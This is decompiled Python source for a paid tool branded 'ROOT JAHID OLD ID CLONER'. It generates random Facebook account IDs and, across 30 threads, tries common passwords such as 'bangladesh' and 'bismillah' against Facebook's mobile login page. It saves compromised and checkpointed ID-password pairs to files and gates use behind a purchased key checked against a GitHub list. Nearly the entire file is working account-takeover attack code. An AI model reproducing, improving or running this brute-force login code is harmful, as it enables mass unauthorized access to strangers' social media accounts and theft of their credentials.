# -*- coding: utf-8 -*-
# uncompyle6 version 3.9.1
# Python bytecode version base 3.11.0 (3534)
# Decompiled from: Python 3.11.9 (main, Apr  2 2024, 08:25:04) [Clang 15.0.0 (clang-1500.3.9.4)]
# Embedded file name: meyexudi
# Compiled at: 2024-05-18 10:48:33
# Size of source mod 2**32: 12431 bytes
import os, sys, time, requests, uuid, random, bs4, mechanize, concurrent.futures, subprocess, platform, base64, string, re
from datetime import datetime
from random import randint, choice
from string import digits

G = "\x1b[1;97m"
W = "\x1b[38;5;48m"
Y = "\x1b[38;5;205m"
B = "\x1b[38;5;46m"
A = "\x1b[38;5;15m"
C = "\x1b[38;5;8m"
D = "\x1b[38;5;226m"
E = "\x1b[38;5;123m"
F = "\x1b[38;5;160m"
J = "\x1b[38;5;81m"
L = "\x1b[0;34m"
ok = []
cp = []
id = []
user = []
loop = 0
ugen = []

# --- Note: Added missing string import ---
import string

def clear():
    os.system("clear")


def linex():
    print(f"{A}--------------------------------------------------")


def logo():
    clear()
    print(
        "\x1b[1;97m\n ================TAKE LOVE================\n\n     \x1b[0;92m██  \x1b[0;91m█████  \x1b[0;93m██   ██ \x1b[0;94m██ \x1b[1;96m██████  \n     \x1b[0;92m██ \x1b[0;91m██   ██ \x1b[0;93m██   ██ \x1b[0;94m██ \x1b[1;96m██   ██ \n     \x1b[0;92m██ \x1b[0;91m███████ \x1b[0;93m███████ \x1b[0;94m██ \x1b[1;96m██   ██ \n\x1b[0;92m██   ██ \x1b[0;91m██   ██ \x1b[0;93m██   ██ \x1b[0;94m██ \x1b[1;96m██   ██ \n \x1b[0;92m█████  \x1b[0;91m██   ██ \x1b[0;93m██   ██ \x1b[0;94m██ \x1b[1;96m██████\n\n\n =================ROOT JAHID IS A BRAND===============  \n        \n+---------------------------------------------------+\n|  \x1b[0;94m [!]\x1b[0;90mTOOL OWER : \x1b[0;92mROOT JAHID      \t   | \n| \x1b[0;94m  [!]\x1b[0;90mTOOL NAME : \x1b[0;92mOLD ID CLONER            | \n| \x1b[0;94m  [!]\x1b[0;90mVERSION   : \x1b[0;92m0.1                       |\n| \x1b[0;94m  [!]\x1b[0;90mTYPE      : \x1b[0;92mPAID                      |\n| \x1b[0;94m  [!]\x1b[0;90mWHATS APP : \x1b[0;92m+8801739840617           |\n+---------------------------------------------------+ \x1b[0;00m"
    )

def meyexudi():
    clear()
    logo()
    print(" \x1b[1;97m[\x1b[1;92m•\x1b[1;97m]\x1b[1;92m WHAT IS YOUR NAME \x1b[1;91m: \x1b[1;32m")
    uname = input(" \x1b0[+][KEY]  : ")
    try:
        uuid = str(os.geteuid()) + str(os.getlogin())
        id = "".join(uuid)
    except:
        id = "ROOT JAHID"
    
    httpCaht = requests.get("https://github.com/RootJahidXploit/RJ-APPROVED-KEYS/blob/main/RJ-APPROVED-KEYS").text
    if id in httpCaht:
        print(" \x1b[32;1m[+] Your Key : " + id)
        msg = str(os.geteuid())
        time.sleep(0.5)
        options()
    else:
        print(" \x1b[1;30m[•] IF U WANT TO BUY THEN PRESS ENTER ")
        os.system("espeak -a 300 \" Hello,   Sir,  Assalamualaikum,   I,   Am,    Robot,   of,   Root Jahid ,    Please,   Send,   Your,   Key,\"")
        time.sleep(1)
        
        # Corrected WhatsApp link generation
        text_to_encode = f"Hello Sir ! Please Approve My Token The Token Is : {id}"
        encoded_text = requests.utils.quote(text_to_encode)
        
        os.system(f"am start https://wa.me/+8801739840617?text={encoded_text}")
        tkss = "Assalamualikum,"
        time.sleep(1)
        exit()

def options():
    logo()
    print(f" {A}<|1|> OLD Cloning ")
    linex()
    memek = input(f" {A}<|?|> Choice >> ")
    if memek in ("1", "01"):
        _____oldx_____()
    else:
        exit()

def _____oldx_____():
    logo()
    print(f" {A}              TOTAL UID CLONING ")
    linex()
    print(f" {A}      EXAMPLE 2008-2009-2010-2011-12")
    linex()
    limit = int(input("               ENTER LIMIT <<>> "))
    for nmbr in range(limit):
        nmp = "".join(random.choice(string.digits) for _ in range(9))
        user.append(nmp)
    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as tred:
        logo()
        tl = str(len(user))
        print(f" {A}<|•|> Total ID  {B}>> {A}{tl}")
        print(f" {A}<|•|> Clong Has Been Started...")
        print(f" {A}<|•|> Use Flight Mode For Speed Up")
        linex()
        for love in user:
            uid = "10000" + love
            pwx = [love, "bangladesh", "jannat", "bismillah", "sumaiya", "sadiya"]
            tred.submit(____old____, uid, pwx, tl)
    print(f" {A}<|•|> Cloning Complete Brother ")
    print(f" {A}<|•|> Total Ok >> " + str(len(ok)))
    print(f" {A}<|•|> Total Cp >> " + str(len(cp)))

def ____old____(uid, pwx, tl):
    global loop
    global cp
    global ok
    global id
    sys.stdout.write(f'\r {A}<|ROOT JAHID-XD|> <|{loop}|> <|{len(ok)}|> {len(cp)}/{tl} '),
    sys.stdout.flush()
    try:
        for ps in pwx:
            session = requests.Session()
            pro = random.choice(ugen)
            free_fb = session.get("https://mbasic.facebook.com").text
            log_data = {'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),'m_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),'try_number': "0",'unrecognized_tries': "0",'email': uid,'pass': ps,'login': "Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com','method': 'GET','scheme': 'https','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','cache-control': 'max-age=0','sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="111", "Google Chrome";v="111"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'none','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': pro}
            lo = session.post(
                "https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8",
                data=log_data,
                headers=header_freefb,
            ).text
            log_cookies = session.cookies.get_dict().keys()
            if "c_user" in log_cookies:
                coki = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"\r\r{B} [ROOT JAHID-OK] {cid} | {ps} ")
                open("/sdcard/ROOT JAHID-OK.txt", "a").write(cid + "|" + ps + "|\n")
                ok.append(cid)
                break
            else:
                if "checkpoint" in log_cookies:
                    coki = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
                    cid = coki[24:39]
                    print(f"\r\r{D} [ROOT JAHID-CP] {cid} | {ps} ")
                    open("/sdcard/ROOT JAHID-CP.txt", "a").write(cid + "|" + ps + "\n")
                    cp.append(cid)
                    break
    except requests.exceptions.ConnectionError:
        time.sleep(30)
    except Exception as e:
        pass
    loop += 1

if __name__ == "__main__":
    meyexudi()